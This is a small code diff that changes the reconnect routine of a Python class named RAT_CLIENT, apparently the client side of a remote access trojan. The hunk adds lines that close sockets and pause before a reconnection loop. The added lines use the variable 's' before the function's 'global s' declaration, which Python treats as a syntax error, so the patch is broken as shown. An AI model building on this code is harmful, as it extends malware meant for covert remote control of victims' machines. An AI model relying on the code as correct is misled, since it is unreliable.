@@ -41,6 +41,9 @@ class RAT_CLIENT:
         self.curdir = os.getcwd()
 
     def build_connection(self):
+        s.close()
+        client.close()
+        time.sleep(5)
         connected = False
         global s
         while not connected:  
